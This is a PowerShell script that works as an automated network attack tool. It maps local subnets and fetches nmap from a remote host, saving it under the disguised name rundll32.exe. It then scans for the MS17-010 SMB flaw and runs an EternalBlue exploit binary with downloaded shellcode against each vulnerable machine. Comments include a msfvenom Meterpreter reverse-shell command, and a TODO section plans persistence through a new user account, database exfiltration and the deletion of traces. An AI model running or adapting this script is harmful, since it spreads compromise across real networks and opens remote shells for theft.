Add-Type -AssemblyName System.IO.Compression.FileSystem
$ComputerName = $env:COMPUTERNAME

function InterfacesFinder(){          
 foreach ($Computer in $ComputerName) {            
  if(Test-Connection -ComputerName $Computer -Count 1 -ea 0) {            
   try {            
    $Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -ComputerName $Computer -EA Stop | ? {$_.IPEnabled}            
   } catch {            
        Write-Warning "Error occurred while querying $computer."            
        Continue            
   }            
   foreach ($Network in $Networks) {            
        $IPAddress  = $Network.IpAddress[0]
        $SubnetMask  = $Network.IPSubnet[0]
        if ($SubnetMask -eq '255.255.255.0'){
            $SubnetBit = 24
            }
        if ($SubnetMask -eq '255.255.0.0'){
            $SubnetBit = 16
            }
        if ($SubnetMask -eq '255.0.0.0'){
            $SubnetBit = 8
            }
 
        $octet =($IPAddress -split ' . ')[-1]-split '\.'
        $octet[-1]=0
        $octet = $octet -join '.'
        $octet = $octet+'/'+$SubnetBit
        
        $targets = "$env:TEMP\targets.txt"
        $octet | Out-File -Append -encoding ascii $targets
    }
   }
  }
 }


function NMAPScanner(){
    $var = nmap -p445 --script smb-vuln-ms17-010 -v -iL $targets
    $i=0
    $indexed=@()

    foreach($line in ($var -split "`r`n")){ 
    
        if($line -match "Nmap scan report for|State:"){
            if($line -match "Nmap scan report for") { 
                $i++
            }
            $indexed += "$i-$line`r"
        }
    }

    # Create a table object
    $table = New-Object system.Data.DataTable "Results" 

    # Create table
    $cols = @("System","Vulnerable")
    
    # Schema (columns)
    foreach ($col in $cols) {
        $table.Columns.Add($col) | Out-Null 
    }
    if(($indexed.count -gt 1) -and ($indexed -match "VULNERABLE")){
        for ($i = 1; $i -lt $indexed.Length; $i++){ 
            if($indexed[$i] -match "State:"){ 
                $row = $table.NewRow()
                $row.System = "$($indexed[$i-1] -replace '^[0-9]+-Nmap scan report for ', '')"
                #$row.Vulnerable = "$($indexed[$i] -replace '[0-9]+-\|     State: ','')"
                #$table.Rows.Add($row)
                $row.System | ft -Wrap | Out-File -Append -encoding ascii $env:TEMP\results.txt
            }
        }
    } 
    else {
        Write-Host -ForegroundColor DarkGreen "No vulnerabilities found on this host or network."
    }
}

function Unzip
{
    param([string]$zipfile, [string]$outpath)
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

function Exploit(){
    $results = Get-Content "$env:TEMP\results.txt"

    #Meterpreter: Generate a new binary payload, call it .raw and copy it to the temp folder
    #msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.28.130 LPORT=31337 -f raw > meterpreter.raw
    #$meterpreter = Get-Content "$env:TEMP\meterpreter.raw"
    #$shellcode = Get-Content "$env:TEMP\shellcode.bin"

    #Combines the binary ASM shellcode and the binary meterpreter payload
    #$shellcode | Out-File -Append "$env:TEMP\shellcode_exploit.bin"
    #$meterpreter | Out-File -Append "$env:TEMP\shellcode_exploit.bin"

    foreach ($result in $results) {
        #Invoke-EternalBlue -target $result -max_attempts 3 -initial_grooms 12
        & $env:TEMP\eternalblue_exploit7.exe $result $env:TEMP'\shellcode_kali.bin' '12'
        }
}

InterfacesFinder
powershell  Start-Sleep 1 ;
Invoke-WebRequest 'http://172.16.64.1/nmap.exe' -OutFile "$env:TEMP\rundll32.exe"
& $env:TEMP\rundll32.exe /S /v/qn
NMAPScanner

powershell  Start-Sleep 1 ;
Invoke-WebRequest 'http://172.16.64.1/a.zip' -OutFile "$env:TEMP\a.zip"
Unzip $env:Tmp"\a.zip" $env:Tmp"\"
Exploit

#TODO
#persistency
#Add a new user account.

#Exfiltration
#Extracts database info to a remote machine, using the credentials.

#Obfuscation
#Uninstall the NMAP, delete temp files, generate a report to the loot folder.
